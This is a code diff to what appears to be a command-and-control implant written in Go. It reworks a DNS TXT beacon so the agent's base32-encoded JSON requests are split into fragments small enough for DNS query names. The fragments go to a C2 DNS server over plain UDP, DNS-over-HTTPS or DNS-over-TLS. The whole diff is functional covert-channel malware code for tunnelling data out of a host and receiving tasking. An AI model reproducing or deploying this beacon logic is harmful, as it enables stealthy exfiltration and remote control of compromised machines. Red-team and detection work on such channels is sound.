@@ -18,8 +18,10 @@ import (
 )
 
 // sendDNSBeacon performs a DNS TXT-based C2 beacon.
-// It builds a TXT query with the agent UUID (and optional base32-encoded JSON request)
-// in the subdomain, sends it to the C2 DNS server, and reads the TXT response.
+// It builds one or more TXT queries with the agent UUID, fragment metadata and
+// base32-encoded JSON request fragments in the subdomain, sends them to the C2
+// DNS server, and reads the TXT response. Requests larger than one DNS qname
+// can carry are split into fragments, each below the 253-character qname limit.
 // Supports UDP, DNS-over-HTTPS (DoH), and DNS-over-TLS (DoT) based on config.
 func sendDNSBeacon(body []byte) []byte {
 	domain := DNSDomain
@@ -31,37 +33,68 @@ func sendDNSBeacon(body []byte) []byte {
 		return nil
 	}
 
-	// Build the query name: <hex-uuid>[.<base32data>].dns.<domain>
+	// Build the query names: <hex-uuid>[.<total_index>.<base32data>...].dns.<domain>
 	uuidHex := hexEncodedUUID(agentUUID)
-	var qname string
-	if len(body) > 0 {
-		// Encode the JSON body as base32 (no padding) and split into 63-char labels
-		encoded := base32.StdEncoding.EncodeToString(body)
-		encoded = strings.TrimRight(encoded, "=")
-		var labels []string
-		for i := 0; i < len(encoded); i += 63 {
-			end := i + 63
-			if end > len(encoded) {
-				end = len(encoded)
-			}
-			labels = append(labels, encoded[i:end])
-		}
-		qname = uuidHex + "." + strings.Join(labels, ".") + ".dns." + domain
-	} else {
-		qname = uuidHex + ".dns." + domain
-	}
+	queries := buildDNSQueryNames(uuidHex, body)
 
 	// Determine DNS transport: DoH > DoT > UDP
 	dohURL := DNSDoHURL
 	dotAddr := DNSDoTAddr
 
-	if dohURL != "" {
-		return sendDNSDoH(dohURL, qname)
+	var lastResp []byte
+	for i, qname := range queries {
+		var resp []byte
+		if dohURL != "" {
+			resp = sendDNSDoH(dohURL, qname)
+		} else if dotAddr != "" {
+			resp = sendDNSDoT(dotAddr, qname)
+		} else {
+			resp = sendDNSUDP(dnsServer, qname)
+		}
+		if i == len(queries)-1 {
+			// Only the final fragment carries the full response; intermediate
+			// queries are acknowledged with a blank TXT which parses to nil.
+			lastResp = resp
+		}
 	}
-	if dotAddr != "" {
-		return sendDNSDoT(dotAddr, qname)
+	return lastResp
+}
+
+// dnsFragmentMaxBody is the maximum plaintext bytes per DNS fragment. 57 bytes
+// encode to ≤ 92 base32 characters, which fits in two 63-char DNS labels and
+// keeps the assembled qname well below the 253-character limit for any
+// realistic domain.
+const dnsFragmentMaxBody = 57
+
+// buildDNSQueryNames splits body into base32 fragments and returns one DNS
+// query name per fragment. Each name is guaranteed to stay under the DNS
+// 253-character qname cap so recursive resolvers accept it.
+func buildDNSQueryNames(uuidHex string, body []byte) []string {
+	if len(body) == 0 {
+		return []string{uuidHex + ".dns." + DNSDomain}
 	}
-	return sendDNSUDP(dnsServer, qname)
+	total := (len(body) + dnsFragmentMaxBody - 1) / dnsFragmentMaxBody
+	names := make([]string, 0, total)
+	for i := 0; i < total; i++ {
+		start := i * dnsFragmentMaxBody
+		end := start + dnsFragmentMaxBody
+		if end > len(body) {
+			end = len(body)
+		}
+		encoded := base32.StdEncoding.EncodeToString(body[start:end])
+		encoded = strings.TrimRight(encoded, "=")
+		meta := fmt.Sprintf("%d_%d", total, i)
+		labels := []string{uuidHex, meta}
+		for j := 0; j < len(encoded); j += 63 {
+			e := j + 63
+			if e > len(encoded) {
+				e = len(encoded)
+			}
+			labels = append(labels, encoded[j:e])
+		}
+		names = append(names, strings.Join(labels, ".")+".dns."+DNSDomain)
+	}
+	return names
 }
 
 // sendDNSUDP sends a DNS query via plain UDP.
